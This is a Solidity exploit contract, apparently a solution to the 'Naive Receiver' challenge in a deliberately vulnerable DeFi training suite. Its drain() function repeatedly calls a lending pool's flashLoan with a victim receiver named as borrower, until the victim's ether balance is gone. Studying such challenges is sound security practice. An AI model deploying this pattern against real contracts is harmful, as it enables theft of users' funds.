// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract attack {

    constructor (INaiveReceiverLenderPool _lenderPool, address _target) {
        lenderPool = _lenderPool;
        target = _target;
    }
    
    INaiveReceiverLenderPool public lenderPool;
    address public target;
    
    function drain() external {
        while (target.balance > 0) {
            lenderPool.flashLoan(target, 100 ether);
        }
    }
}